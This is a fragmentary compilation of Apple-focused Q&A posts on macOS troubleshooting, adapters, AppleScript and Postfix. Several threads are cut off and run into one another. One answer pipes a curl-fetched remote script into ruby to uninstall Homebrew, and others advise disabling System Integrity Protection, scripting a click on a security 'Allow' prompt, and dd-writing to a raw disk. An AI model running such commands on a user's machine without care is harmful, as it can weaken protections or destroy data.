Protection. Is disabling SIP the only way to fix this?\n\nA: How I solved this issue on Mac OS 10.13 High Sierra:\n\n\n*\n\n*Boot into Recovery Mode (Command-R)\n\n*Open Terminal, disable SIP (csrutil disable), restart\n\n*Login to Guest, logout (it should not hang on a black screen now)\n\n*Boot into Recovery Mode (Command-R)\n\n*Open Terminal, enable SIP (csrutil enable), restart\n\n*Login to Guest, logout (it still works!)\n\n\nA: Same problem in Mojave.

I imagine this wouldn't be too tough to do with Automater, but I haven't found any obvious answers to this online thus far.\nFor example, let's say I use an app that requires me to authenticate with TouchID, or I'm making a payment online with ApplePay. I should be able to verify my identify with my watch as well (this is how ApplePay works in the \"wild\" anyway).\nWould love to hear any ideas about how to do this and would be up for collaborating on a solution as well.\n\nA: No, this currently isn't possible.  \nWe know Apple has the ability to use wifi/bluetooth to unlock your Mac with your Watch if you're close to it.

There were a few minor tweaks that needed to be made to get the script working, which you'll see when you read it.\nThe main thing to bear in mind is to get into the habit of only sending commands to an application that need to be sent to the application.  The rest are often best performed outwith the tell block, so that terminologies don't get mixed up with each other.  For instance, in this case, I'm pretty sure that Pages—along with other applications that use the iWork Suite of AppleScript commands—have their own object specifier called a text item, which is distinct from the one you're trying to employ in your script.\nThe original problem, however, was solved in a similar fashion by setting the variable to the alias returned by choose file outside of the Pages' tell block, but also not forgetting to use that alias inside the tell block to actually open the file, using the open command.\n    set MYTESTFILE to (choose file)\n\n    tell application \"Pages\"\n        set MYTESTFILE to open MYTESTFILE\n        properties of MYTESTFILE\n        copy body text of MYTESTFILE to theText\n    end tell\n\n    set toFind to \"Guy\"\n    set toReplace to \"Gal\"\n    set astid to AppleScript's text item delimiters\n    set AppleScript's text item delimiters to toFind\n    set textItems to theText's text items\n    set AppleScript's text item delimiters to toReplace\n    tell textItems to set editedText to beginning & toReplace & rest\n    set AppleScript's text item delimiters to astid\n\n    tell application \"Pages\" to set body text of MYTESTFILE to editedText\n\n", "Q: Connecting a FireWire 800 external hard drive to MacBook Pro early 2013 through its USB 2 port I need to connect a FireWire 800 external hard drive to a MacBook Pro early 2013 through its USB 3 port.\nI would have done so through the Thunderbolt port but the adaptor for that is too expensive for me at the moment.\nI bought a connector on eBay but the FireWire end was female when I want a male end, but I've looked and can't find a single male FireWire end with male USB 3 end.\nI badly need to restore my new Mac so your help would be greatly appreciated.\nThank you.\n\nA: The Apple Thunderbolt to Firewire adapter is $29, and I don’t think you’ll find much cheaper that that for adapter cables. However if the external Firewire drive is just a normal drive in a Firewire enclosure then you could pull the drive from it and use either a USB3 hard drive case or even a laptop hard drive SATA to USB3 cable. Those cables and enclosures start at around the $10 mark on big ecommerce sites.\n\nA: Unfortunately there are no USB to FireWire 800 adapters.\nFireWire and USB use different protocols thus an adapter could not transfer any data.\nUnless you use some kind of Thunderbolt dock you will need to get your hands on a Thunderbolt to FireWire 800 adapter.\n\n\nA: \nI need to connect a FireWire 800 external hard drive to a MacBook Pro early 2013 through its USB 3 port.\n\nUnfortunately I don't think such an adapter exists and if it did exist I would not expect it to be cheap.\nIt's not that it would be impossible to build such an adapter but the market is small, the engineering work in developing the converter would be non-trivial and there may well be performance issues.\nA thunderbolt to firewire adapter OTOH can be made by bolting together existing chips.\n\nI bought a connector on eBay\n\nBe EXTREMELY careful when buying on ebay or from third party sellers on Amazon.

Homebrew is a community developed package manager for macOS.\nTo completely undo everything that this command did, first uninstall all packages that could have been possibly installed by Homebrew. To do so, follow these steps:\n\n\n*\n\n*Run brew list to list all the installed packages.\n\n*For every listed package p, run brew uninstall p.\n\n*Make sure that all Homebrew packages are removed by running brew list and verifying that the command doesn't give any output. Repeat step 2 until all the packages are uninstalled.\n\n*Now run brew cask list. This should list all the packages installed via Homebrew Cask. The qBittorrent package should be listed as it was installed by following the instructions in the linked web-site.\n\n*To completely remove a Homebrew Cask package, run brew cask zap p where p is the name of the package. For e.g., run brew cask zap qBittorrent to completely remove qBittorrent.\n\n*Make sure that all Homebrew Cask packages are removed by running brew cask list and verifying that the command doesn't give any output. Repeat step 5 until all the packages are uninstalled.\n\n*Finally, after removing all the packages, you can uninstall Homebrew itself by running the following command-line:\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)\".\nRefer official Homebrew FAQ's for more details.\n", "Q: Automator \"Add to Album\" error This Automator workflow worked in Sierra, but it fails in High Sierra with the error, \"The chosen receiving album does not exist in the Photos library: \".

Each monitor has a VGA and a DVI port. Is it possible to connect both to a single USB-C port of the MacBook? If so, how do people do this?\n\nA: It is possible to connect a VGA and a DVI display to one USB-C port on the MacBook, but you need two USB-C adapters in a daisy-chain fashion and a HDMI-DVI adapter.\nFirst you connect the USB-C Digital AV Multiport Adapter (part number MJ1K2AM) to the MacBook USB-C port, then you connect the USB-C VGA Multiport Adapter (part number MJ1L2AM) to the USB-C port on the Digital AV adapter.\nTo get the DVI you also need to connect an Apple HDMI to DVI Adapter (part number MJVU2AM) to the HDMI port on the Digital AV adapter which provides you with the DVI port you need.\nNow you have a DVI port and a VGA port available and only one USB-C port is used on the MacBook.\nThe setup (minus the HDMI-DVI adapter which I don't have) would look similar to this:\n\n\nA: I highly recommend a thunderbolt dock to do this. In my experience it isn't possible to daisy chain the adapters as described in one of the other answers. In fact, the port they are using to daisy chain is only for power in anyway. Yes the connector fits, but doesn’t function.\nUSB-C docks that offer multiple monitors usually rely on DisplayPort Multi-Stream Transport, which is not supported by macOS. Because of this, these adapters are usually listed as Windows only.\n\nA: I use a number of older DVI monitors; DVI <-> hdmi adapters (which are passive devices) are readily available for a couple of dollars, as are DVI <-> hdmi cables (for about the same price as a hdmi cable).\nhdmi -> VGA adapters are active devices, and more expensive.\nEither of these will let you use any of the hdmi adapters for the Mac.\n\nA: You can use KVM VGA Switch to Connect one display to multiple PC's / Laptop's\n\n(source: hdcabling.co.za)\n\nA: Will this work...

A couple of months ago I made a couple of (guilty) in-app purchases for a game, under the impression that even though my family has Family Sharing, that my details would still be used for the purchases. I was later informed that they had in fact been charged to my mum's card (the one who's details are in Family Sharing) instead of mine.\nIs there a way to set it up so that my details are used instead of my mum's, so I don't have to use her money and can instead use my own?\n\nA: Family Sharing uses a single credit card for all users on linked account. You cannot change this on an account by account basis.\nYou can purchase and redeem an iTunes Store gift card and add that to your account. iTunes and the App Store should automatically pay for the item with your store credit before using the family credit card.\n", "Q: Safari opening similar tab on 2nd iPad? Whenever I open a new tab in Safari on one of my iPads, it automatically opens the same tab on another iPad. How do I stop this?\n\nA: Tab sharing through Safari is controlled by the \"Safari\" option in your iCloud syncing settings, so you have two different options if you want to keep this from happening:\n\n\n*\n\n*Remove the iCloud account from one of the devices so that it is no longer aware of what's occurring on the other device.\n\n*Turn the feature off. On the iPad go to Settings > Click your account at the top of the app > iCloud > flip the \"Safari\" option to inactive. (If you're on an older version of iOS this will instead be in Settings > iCloud further down the page > Safari option)\nYou might also be talking about the Handoff functionality, which displays the app icon for the app that is active on another device, and if you tap on that icon, it opens with whatever you were doing on the other device. To turn that off go to Settings > General > Handoff and flip the switch so that it is inactive.\n", "Q: Can MDM track my location? I have Maas360 on my iPhone, but the app isn't installed it's only listed under MDM. Can it track my location even if I didnt give the app location permissions? \n\nA: If you didn’t give the app location permission then the app cannot access your location. If you gave it permission then theoretically yes, it could track you.\nFrom this:\nHow to turn Location Services on or off for specific apps\n\n  \n*\n  \n*Go to Settings > Privacy > Location Services.\n  \n*Make sure that Location Services is on.\n  \n*Scroll down to find the app.\n  \n*Tap the app and select an option:\n  \n  \n*\n  \n*Never: Prevents access to Location Services information.\n  \n*While Using the App: Allows access to Location Services only when the app or one of its features is visible on screen.

I really like the Aqua UI which is available on Mac OS releases before OS X Yosemite 10.10.\nIt is possible to install OS X Mavericks on my 2016 MacBook Pro?\n\nA: No. The oldest OS a Mac computer can support is the one the model originally shipped with (for you, 10.12 Sierra). You should be able to get the Mavericks background image from somewhere if that’s what you like about 10.10.\n", "Q: How to get Boot Camp Audio Drivers for Windows 10 on High Sierra? How do I get Boot Camp Audio Drivers iMac(10.13.4) in Win10, they did not install. Everything else works in Windows.\n\nA: Often the audio drivers fail to work when Windows is installed using either the wrong Boot Camp Support Software (Windows Support Software) or Windows is installed using the wrong boot method (BIOS vs EFI). \nThe best way to get the correct Boot Camp Support Software is to either use the Boot Camp Assistant to download the software or use the Boot Camp Assistant to install Windows. \nUsually, Windows 10 installs for an EFI boot on Macs that Apple documents to officially support Windows 10. Otherwise, Windows 10 should be installed to use the BIOS boot method.\nIf you need help determining which boot method Windows is using, post a comment including the model/year of your Mac.\n", "Q: How to change the 9AM default for all-day Calendar events Apple Calendar allows setting a default alert for events, including all-day events.  But with all-day events there is no obvious way to control the time of the alert.  \nAll options displayed in the UI are for 9AM.\n\nThis is mind-bogglingly restrictive.  If I want to be alerted the day before an event, or two days before an event, I would never want to be alerted at 9AM—that's when I'm either sleeping or thinking about what I need to do that day.  \nHow can I change this?  Can I get more granular control somehow with defaults write?  Or is there some other way?  (A background process that detects new events added to my calendar and fixes their bad defaults?)\n\nA: This question is for previous macOS version.\nThe time can be changed in macOS 10.14.3 Mojave:\n\n\n", "Q: Is there any GUI application that runs on both Mac OS X 10.0 Cheetah and macOS 10.13.4 High Sierra? I'm trying to make the argument that macOS (Mac OS X) has a very long legacy as a desktop operating system, but my colleagues brought up the point that it's gone through so many iterations since 10.0 that it might as well be considered completely different.\nMy question is this: Is there any way to run even one GUI application on both Cheetah and High Sierra?\nDirty tricks can be used, but it has to be the same distributable (e.g. .app file). I don't really care if it's a fat binary, or if I have to install a different window server or anything like that. As long as I can somehow demonstrate to my colleagues that I have a GUI application that I can run on Cheetah that also runs just fine on High Sierra.\n\nA: According to Wikipedia, Cheetah was shipped with AppleScript. So if you can have a Mac running Snow Leopard, according to comments of this question (and not the answer, it's strange), it seems that an AppleScript saved as app give a universal app (PowerPC G4 and above, or Intel). I haven't tested, but perhaps if you save this AppleScript:\ndisplay dialog \"hello\"\n\nas app on the Snow Leopard's AppleScript Editor, it will run under Cheetah and High Sierra.\nThis AppleScript app is very simple, and display \"hello\" in a window, with a \"OK\" button. So this is a very simple GUI application.\n\nA: Most Java applets?\nCould wrap it in an .app container with a shell script that launches the java and loads the applet.\n", "Q: Can I install OS X 10.10 on a MBP Mid-2015 I buy today? I am planning on buying a MacBook Pro 15\" Mid-2015 (not a used one, but a new one directly from Apple). For reasons of running legacy software I would like to install Mac OS X 10.10 on it. When it came out, this MBP was delivered with Mac OS X 10.10.3.\nNow, I also know that you can't usually downgrade a system that you newly buy (say downgrade a Late-2016 MBP to OS X 10.10), as it was never available with such an old OS X in the first place.\nHowever, since the Mid-2015 MBP was in fact available with OS X 10.10, I am now wondering: Could I downgrade to OS X 10.10 when I newly buy such a machine today?\n\nA: Interesting question.\nOriginally these models shipped with macOS Yosemite 10.10.3. However, my understanding is that current models ship with macOS El Capitan 10.11.2.1\nTypically this would mean you can’t install a version of macOS earlier than the version it actually ships with and I suspect that would still be the case here.\nHowever, I don’t recall seeing any firmware updates for this model, so it may be possible to do what you want manually (i.e. you wouldn’t be able to do it from Recovery Mode, you’d have to try booting from an external installer or try using Target Disk Mode).\nMy inclination would be to say it isn’t going to be possible, but in this rare case it may be.\nHopefully someone else who has tried this can chime in here and give you a more definitive answer. You could also contact Apple and see what they say.\n1. Last time I checked (admittedly a few months ago - early this year so well after macOS High Sierra was released) these models were still shipping with 10.11.2. However, I am based in Australia and it could be just a case of how fast production batches are selling. I will check again in a couple of hours and update this answer as soon as I can.\n[UPDATE]\nI've just had confirmation that models being manufactured now ship directly from the factory with macOS High Sierra installed. My guess is getting one with El Capitan pre-installed is going to be a remote possibility at best, and even then that'd be based on whether your location has older stock.\nSo, installing an older version of macOS depends entirely on whether there's been a firmware update on that model. Unfortunately, some years back Apple started automatically including firmware updates (if/when required) within macOS updates/upgrades and I'm not aware of any current consolidated list of these updates, so it's not easy to check which devices had firmware updates and what those updates meant. Previously you could refer to this page.\nIn other words the only way to find out with 100% certainty is to try it, but I'd err on the side of caution and assume this won't be possible. I suppose you could ask Apple if you could return it within the return period on the basis that you can't install Yosemite, but they're likely to tell you up front that it's not going to be possible.\nThe only way to be 100% sure would be to purchase one of the original ones that hasn't been updated beyond Yosemite, although I suspect that won't be easy to find. You'd also be 99+% sure if you bought an original one that shipped with Yosemite but has since been upgraded. However, if you purchased one brand new today that ships with High Sierra, your odds drop to less than 50/50 in my opinion.\n\nA: I assume you expect the 2015 Mac to arrive with High Sierra installed? I state this because in 2015, I could have purchased a 2015 iMac and instead opted for a 2013 model. This 2013 iMac came with the latest version of macOS available at the time, even though that version of macOS did not exist when the machine was made.\nMy best estimate would be that OS X 10.10.3 would work, but OS X 10.10.2 or older would not. So, if you can download Yosemite from the Apps Store, you would get that last release OS X 10.10.5, which should work. Of course, to download from the Apps Store you would have needed to purchase (for free) when Yosemite first was released. I do not believe you can currently find Yosemite in the Apps Store.\nAnother option would be to try downloading OS X using macOS Recovery. I recently tried do this for the 2013 iMac and Yosemite downloaded. This Mac was original built to run OS X 10.8.4. The instructions for using macOS Recovery did say the \"the version closest to it that is still available\".\nI should add that I also have legacy software that requires an OS older that High Sierra. I am currently testing running Yosemite in a free copy of VirtualBox. The installation was surprisingly easy. According to the instructions, your model would have to fake the CPU.\n\nA: Yes, OS X 10.10 can be installed on a brand new MBP Mid-2015\nAlright, so I just took the risk and bought the MBP without exactly knowing if I would be able to install 10.10 or not. I managed to get it installed.\nHere is a rough step-by-step instruction of the process:\n\n\n*\n\n*Download Yosemite from the App Store (this is probably only possible\nif you have older Macs and have had access to that OS).\n\n*This installer will not run under macOS 10.13 (it will tell you this OS is to old to install). Don't let that throw you off, though.\n\n*From this installer you can create a bootable Yosemite install USB-drive. I followed this guide here. I created this image on my old MBP under Mac OS X 10.8.5, but I think this process should work under macOS 10.13, too.\n\n*With this USB-drive connected, boot your Mac while holding down the option key. Select the Yosemite install image and install it on the Mac.\n\n\nPersonally I installed I partitioned my drive into two drives, one small one for the Yosemite system and the larger one for the current system.\nSince the partition with the new drive uses APFS as the file system, but Yosemite uses (has to use) the older Mac OS Extended (journaled), I am now able to read and write from both systems when I am logged into the newer system, but can only read and write from the older system when I am logged into the older system.\nThanks for the people involved in this thread for putting some effort into trying to solve this question, very much appreciated.\n", "Q: macOS not resolving IP Address I used a certain domain name temporarily to build a site on.

I am looking for a way to search the serial number (of Apple products such as iPhones, iPads, Macs, etc.), and get information about the original configuration of that specific device.\nI am aware of this (or the JSON version) page of Apple's site that allows you to get the specs page of the product from the serial number you search, but I would like to get the specific configuration of that particular device.\nFor example, if I search my serial number for the MacBook Pro 2017 with 3.5 GHz Core i7, 16GB of Memory, and 1TB storage, I get a general page without any of the information above. The page lists all the possible configurations instead of the specific configuration of my MacBook Pro.\nIs there some way to search a serial number and get information about the configuration of a specific device?\n\nA: If you’re looking for something on Apple’s site, I do not know of one. However, EveryMac.com has a lookup search that I have had a pretty good success with. You can look Apple products up by serial number, model number, EMC number, or a number of other identification numbers on this search page.\n", "Q: Can't click using trackpad on Macbook Pro (2010) I am trying to troubleshoot a 2010 Macbook Pro with a trackpad that won't register clicks. The trackpad makes the click-clack noise and it can be used as a pointer with no issues, but the clicks don't register. I've read this question and I'm trying to figure out if there's anything else to try before I open it up to examine the battery/screws (as seen here). Here's what I've tried.\n\n\n*\n\n*Checked to see if the laptop will work/click with external mouse. Yes.\n\n*Checked to see if it happens on other user accounts. Yes.\n\n*Checked to see if I can turn on \"tap to click\" in System Preferences. Yes.\n\n*Checked Accessibility Settings in System Prefrences just in case.\n\n*Ran Disk Utility to verify/repair permissions.\n\n*Did an SMC reset.\n\n*Upgraded the OX from 10.6.8 to El Cap, no change\n\n\nI don't see any evidence of battery swelling but that seems to be the next step. The trackpad clicks but it definitely clicks more on the bottom than on the top, if that makes sense. The laptop belongs to my elderly landlady who would prefer it works the same as always, even though she's been able to use it with a mouse. I'm not sure tap to click is going to solve the issue for her. Anything else I can try? Thanks.\n\nA: OK, I did some more troubleshooting and took the thing apart. No signs of battery swelling though I did unseat/reseat the thing. When I put it back together I literally banged on the trackpad until it started being responsive again. This would not normally be my plan but a tech suggested it and, oddly, it seemed to work. \nLong term plan is probably replacing the battery or just replacing the entire unit altogether.\n", "Q: Allow button not working in system preferences I am trying to install some software, (at this particular moment I want to install VirtualBox, although this issue has happened with other software), and I have to click \"Allow\" in System Preferences, in the Security & Privacy -> General window. When I click on it, nothing happens, and the button and message stays there.\nI looked online, and all of the solutions say that there is some kind of program running that captures/forwards mouse clicks and such, and thus I am not \"directly\" clicking on the Allow button.\nThe problem is that I don't know of any programs that I'm running that do this.\nI am on a Macbook Pro 13 inch 2016 with touchbar, running macOS High Sierra\n\n\n*\n\n*I am not connected remotely\n\n*I have tried restarting my computer\n\n*I have tried running the installer through terminal, with and without the sudo command\n\n*I have tried right-clicking and clicking on \"open\" on the .pkg file\n\n*I have tried unlocking the system preferences page before clicking \"Allow\"\n\n*I tried re-downloading the .pkg file\n\n\n\n\nA: If you are connecting to the computer remotely with software such as TeamViewer, VNC etc. it will not work, because macOS doesn’t allow you to press “Allow” button through other applications. You have to directly press that button with your trackpad.\n\nA: Nothing was working for me, local clicking, keyboard selection, nothing. Turns out it was a piece of security software that hadn't been authorized correctly. This security software was the process actually \"performing\" the click. To find out what bit of software or hardware happens to be being blocked, you have to establish what Process ID it uses, then identify the software/hardware from its PID, and go from there, either killing or uninstalling the hardware/software, and repeating until the click succeeds. Man I hate macos. \n\n\n*\n\n*Open Console ( Finder > Go > Applications > Utilities > Console )\n\n*Click, press, tap, space, automator the button \n\n*A message will pop onto Console (under your Device's main logs) that looks someting like this: “Dropping mouse down event because sender’s PID (1234) isn’t self or 0”\n\n*Open Activity Monitor and sort by the PID field. Find the PID, [force] quit the process, try to click/press/tap/space/automator the button again, should work. If not, repeat this process - probably another PID blocking you now. \n\n\nNote, the above is NOT a workaround for being unable to use remote software - that just won't work unless you completely disable SIP. \n\nA: This worked for me on High Sierra 10.13.4:\n\n\n*\n\n*System Preferences > Keyboard > Shortcuts > Select 'All Controls'\n\nThen:\n\n\n*\n\n*System Preferences > Privacy & Security > Press 'Tab' until 'Allow' is selected > Press 'Spacebar'\n*Note: the Privacy & Security page may need to be unlocked before 'Tab' will work.\n*Note: After open Security & Privacy and selecting General tab you should push tab key to select allow button after that push space bar key!\nHope this helps!\nCredit to @dansanduleac's answer on GitHub\n\nA: Try safe mode. It should disable any services running at the background, letting you to click the Allow button. You can get into safe mode by rebooting and holding shift during reboot.\n\nA: for me it worked after i quit VLC\n\nA: After looking through some of these answers, I realized that the issue was the Spectacle window manager app. Once I quit that it worked fine.\n\nA: We can use Apple Script to click on the Allow button as follows:\n\n\n*\n\n*Press Shift Command 4 to start screen capture (but don't actually go thru with this):\n\n*Hover over the Allow button and note the coordinates (e.g. 620, 534)\n\n\n\n\n\n*Open a Terminal window and use those coordinates in a script:\nosascript -e 'tell application \"System Events\" to click at {620, 534}'\n\nA: It worked for me when I quit Chrome before clicking 'Allow'.\n\nA: Using Micah Roth's solution I figured out that it was the fact that I was using a Wacom pad. I looked up the process and it was WacomTabletDriver. To fix this I went into System Preferences > Accessibility > Mouse & Trackpad and checked Enable Mouse Keys.

Option-clicking displays both input and output as grayed-out, with no devices shown.\nTo be clear: It's not about audio being distorted or noisy or flaky or weird; I don't have any audio output at all.\nApparently, my machine no longer has an audio output device.\nEditors, please keep reading before you mark this as a dupe: I am aware that this issue has been asked here many times, but none of the suggested fixes work, so I'm kind of trying to pull all the bits and pieces into a single coherent post.\nTrying to fix the issue, I tried all of the following (suggested here and elsewhere), sometimes repeatedly, with no luck:\n\n\n*\n\n*Rebooted the machine (duh); checked if my OS is up-to-date (it is)\n\n*Plugged a headphone jack in and out repeatedly, also jiggling it around a little, as people have been suggesting that the jack's internal switch may sometimes get stuck and cause this issue\n\n*Checked the system prefs for sound/audio, which would normally let me select \"Internal speakers\" as the default output device. But there is no such option, nor any other device to choose from (the selector window is just completely empty)\n\n*Launching audio/MIDI setup (which showed up with an empty main window), I tried to set up a \"main device\", which worked, but it said that the main device was not available/present (or something to the effect that the hardware in question is apparently AWOL)\n\n*Tried fixing permissions on the main volume (but learned that this isn't even possible anymore on Sierra)\n\n*Did both a PRAM/NVRAM and SMC reset\n\n*Rebooted into hardware test mode and did both the normal and extended tests; both found \"no trouble\"\n\n\nOther than this issue, my machine is completely fine, both hardware and software wise.\nNow I’m all out of ideas.\nOf course I may also have damaged the sound hardware, but that wouldn't make any sense. First of all, I did nothing to the machine that could have caused this. It was sitting comfortably on my desk all the time. Second, a hardware malfunction would surely result in some kind of problem being reported on the OS side, or would it?\nThe only thing left that comes to mind is that the audio device driver at kernel or IO device level may have become corrupted or disabled. Could this happen? (If so, how? I haven't changed any system settings, installed any software (especially no \"flaky\" ones) or did anything else unusual).

I had recently replaced/upgraded the original 1TB HDD with a 4TB HDD thinking/hoping it would resolve a problem with vertical lines on my monitor. It did just that, briefly, but then about a day later, the problem returned. I swallowed hard, opened up the iMac again, and replaced the graphics card, upgrading from the original 1GB to an AMD Radeon HD 6970M 2048 MB. To do that, it was necessary to completely remove the logic board as the graphics board connectors are on the back of the logic board (thanks a lot Apple!). It all went back together well, and everything but sound is perfect. It's possible that I could have damaged the logic board at some point, but it seems likely something else given the number of complaints about this with nothing being done internally. Whereas the original poster had NO system out options, I had one - digital output. Internal speakers option had disappeared, although internal microphone and line input functions remained normal.\nAll the tricks described in detail in others places failed to work, headphones connected to the jack do NOT function, but using a Bose wireless Bluetooth headphone works normally. The solution for me was rather than pour any more $$ into this old machine that is no longer my primary computer was to purchase and pair a Bose portable speaker with the iMac. The sound is much improved over the old internal speakers, I can leave it on it's charging pad to have continuous sound, and I can take the speaker anywhere I want pairing it to the iPhone X or an iPad.\nThe only thing bugging me is that I couldn't figure it out, but not worth wasting any time over either. Hope you've solved your problem.\n", "Q: Macbook Air 6,2 High Sierra not detecting bootable USB stick I see this issue reported a lot but all the accepted solutions have not worked for me.\nI have created a bootable USB stick using UNetbootin with a Debian image.

What am I doing wrong?\n\nA: If you have succesfully made a bootable linux USB stck before with your method, try a different USB stick or image. It sounds like you have done this before, which suggests perhaps that the image is not right in some way.\nA GUID partition table and FAT format are correct.\nOther things to try:\n1. Try Etcher: It's simple and free. You can find a tutorial from Ubuntu regarding making a bootable Ubuntu drive with it, but all it really says is \"use Etcher.\"\n2. Try Mac Linux USB Loader. It costs ~ $5, and while it only supports certain OSes, Ubuntu is one, so Debian probably works. \n3. Try dd - note it is /dev/diskx not /dev/diskxs3 (partition 3 or other on disk x). Another tutorial also has you convert the image; I haven't used that method but it seems to work for people:\ndd if=/path/to/image of=/dev/diskx bs=512k && sync\n\nI like to know what dd's progress is, so I use pv, which you can get using Homebrew or Macports:\ndd if=/path/to/image | pv | dd of=/dev/diskx bs=512k && sync\n\nYou'll probably have to put sudo before each dd command.\nI hope that helps - you'll definitely get something to work eventually, whether it's the image, method, or USB stick.\n", "Q: How to remove unwanted text from a string?

But it's reasonably clean and, presuming the tags are all simple ReactJS comment tags, it will do a reliable job.\n    set string1 to \"<!-- react-text: 45 -->“<!-- /react-text --><!-- \\nreact-text: 46 -->Megan Fox<!-- /react-text --><!-- react-text: 47 -- \\n>”<!-- /react-text -->\"\n    \n    set string2 to \"<!-- react-text: 477 -->“<!-- /react-text --><!-- react-text: 478 -->iPhone 8<!-- /react-text --><!-- react-text: 479 -->”<!-- /react-text -->\"\n    \n    stripTags from string1 --> \"“Megan Fox”\"\n    stripTags from string2 --> \"“iPhone 8”\"\n    --------------------------------------------------------------------------------\n    to stripTags from s as text\n        local s\n        \n        # Eliminate linebreaks and join to form one line of text\n        set the text item delimiters to {null, linefeed, return}\n        set s to the text items of s as text\n        \n        # Use bash to isolate all the various tags within the string\n        # Note: not suitable for tags with irregular content, such as\n        # any that unexpectedly contain '<' or '>' as part of their\n        # text content.  However, that shouldn''t be an issue here.\n        do shell script \"egrep -io -e '<[^>]+>' <<<\" & the quoted form of s\n        \n        # Use the tags as a basis for elimination using AS's TIDs\n        set the text item delimiters to {null} & paragraphs of the result\n        set s to the text items of s as text\n        \n        return s\n    end stripTags\n\nstring1 is a copy of your variable FirstTitle, including the line breaks that it contained (I'm not sure whether these were in their intentionally or an artefact of when you copied your script over into the browser); their presence or absence doesn't affect the efficacy of my script, but merely necessitated the two lines at the start of the stripTags handler that gets rid of them.\nstring2 is the text you supplied at the bottom of your question.\nI've shown the output of each of these following processing.  I retained the double so-called \"smart\"-quotes that are part of the string and lie outwith the tags; I did see that you had opted to eliminate them, but their presence here—merely for demonstration purposes—are a nice visual reassurance that the script targets only the tags, and preserves the text in between.  I hope you don't mind if I leave those smart-quotes for you to deal with as you wish.\nLet me know if you have any queries.\nADDED 2018-05-12:\n@cjeccjec Thank you for updating the website information with the correct URL.  Tip for next time: include the code you're using to get the title.  It'll be easier for people to help you and it will attract more help as well.\nLuckily, this problem seems quite straightforward.  Using getElementsByClassName() is a good idea, and you even managed to identify the classname of interest, term-keyword__keyword.  Well done.\nThe elements assigned to that classname are <p> elements.  They do have a title property, but it's empty, so I suspect that's not what you're using nor what you're after at all.\nThey also have a property called textContent, which, as it suggests, returns the text contained within the element, i.e. the labels of the items being compared in this game.  I believe that's what you're after, and it's completely free from ReactJS tags.\nThis code returns an array of the textContent properties from the three loaded p.term-keyword__keyword tags on the site at any one time: the two currently visible and in play being compared; and one off-screen to the right waiting to scroll into view for the next comparison.\n    Array.from(document\n              .getElementsByClassName('term-keyword__keyword'),\n               e=>e.textContent.slice(1,-1)\n              );\n\nI also took the liberty of slicing off the quotes from the beginning and end of the texts.\nIncorporate this into AppleScript like so:\n    tell application \"Safari\" to set labels ¬\n        to do JavaScript \"Array.from(document\" & ¬\n        \".getElementsByClassName('term-keyword__keyword'),\" & ¬\n        \"e=>e.textContent.slice(1,-1));\" in the front document\n    \n    --> {\"Microsoft Word\", \"Moobs\", \"Malaysia\"}\n    \n    item 2 of labels --> \"Moobs\"\n\nThose were the results that I got returned whilst playing the game.  I was trying to guess whether \"Microsoft Word\" or \"Moobs\" had more internet searches, which I got correct; then \"Malaysia\" scrolled into view as I already knew it would.\nUsing this method, you don't need to strip any ReactJS tags away, nor any quote marks.\n\nA: This is quite easily solvable by using the NSString in the Foundation framework, which includes support for regular expressions.\nuse framework \"Foundation\"\nset sample1 to \"<!-- react-text: 477 -->“<!-- /react-text --><!-- react-text: 478 -->iPhone 8<!-- /react-text --><!-- react-text: 479 -->”<!-- /react-text -->\"\nlog sample1\nlog removeHTML(sample1)\n\non removeHTML(instr)\n    set nStr to current application's NSString's stringWithString:instr\n    return (nStr's stringByReplacingOccurrencesOfString:\"<[^>]+>\" withString:\"\" \n        options:(current application's NSRegularExpressionSearch) \n        range:{0, nStr's |length|()}) as text\nend removeHTML\n\nOutputs:\n<!-- react-text: 477 -->“<!-- /react-text --><!-- react-text: 478 -->iPhone 8<!-- /react-text --><!-- react-text: 479 -->”<!-- /react-text -->\n”iPhone 8”\n\n", "Q: Why has .localdomain been introduced in Postfix When sending email on my local machine (echo foo | sendmail $USER), the email contains From: (my-user-name)@(my-machine-name).localdomain.\nAccording to my command line tools my host doesn't seem to have a local domain extension added to any of the various host names macOS allows.\n$ grep localdomain /etc/hosts\n$ grep localdomain /Library/Preferences/SystemConfiguration/preferences.plist\n$ scutil --get ComputerName\n(my-machine-name)\n$ scutil --get HostName\n(my-machine-name)\n$ scutil --get LocalHostName\n(my-machine-name)\n$ hostname -f\n(my-machine-name)\n$ alias hostname\n-bash: alias: hostname: not found\n\nMy research shows .localdomain stems from a Postfix update. However the Git log contains only generic messages, and I couldn't glean from the HISTORY file why it was added.\n\n\n*\n\n*Who has introduced .localdomain, and why?\n\n*For which specific uses is it applicable, if any? (eg. should it be used email Message-ID?)\n\n\nA: There is no email client in your example (besides possibly the echo); sendmail is part of the Mail Transport Agent which on current versions of macOS is by default Postfix. Postfix will set the domain either from the configuration file or failing that some internal value or system call lookup:\n$ postconf | grep localdomain\nmydomain = localdomain\n$ postconf -n | grep \"^mydomain\"\n$ \n\nThis shows that (at least on my system) the mydomain value is localdomain and that that value is not set in /etc/postfix/main.cf. It thus must instead come from an internal value or via some system call. (You could set it to something appropriate in main.cf; many Mail Transport Agents will reject mail from such local domains because spammers, or otherwise score the message as more likely to be spam. This may not be a problem if the email will never reach the Internet.)\n$ strings /usr/sbin/postfix | grep localdomain\nlocaldomain\n$ cfu 'char buf[254]; gethostname(buf,254); printf(\"%s\\n\",buf)'\nglide.local\n$ \n\nShows that postfix could be using localdomain as an internal value, as that string appears in the binary. This is likely given that gethostbyname(3) returns something that is not localdomain on my system (you probably don't have cfu but there are many ways to execute arbitrary system calls). If one downloads the source code for Postfix, there are indeed various references to localdomain:\n$ find . -name \"*.c\" -exec fgrep localdomain {} +\n./src/global/mail_addr_find.c:    UPDATE(var_mydomain, \"localdomain\");\n./src/global/mail_addr_find.c:    UPDATE(var_myorigin, \"localdomain\");\n./src/global/mail_addr_find.c:    UPDATE(var_mydest, \"localhost.localdomain\");\n./src/smtp/smtp_map11.c:    UPDATE(var_myhostname, \"localhost.localdomain\");\n./src/smtp/smtp_map11.c:    UPDATE(var_mydomain, \"localdomain\");\n...\n\nSo this value is very likely to be set internally by Postfix, and if necessary should be adjusted by editing the configuration.\n", "Q: Sign out iCloud - can't keep a copy of data.

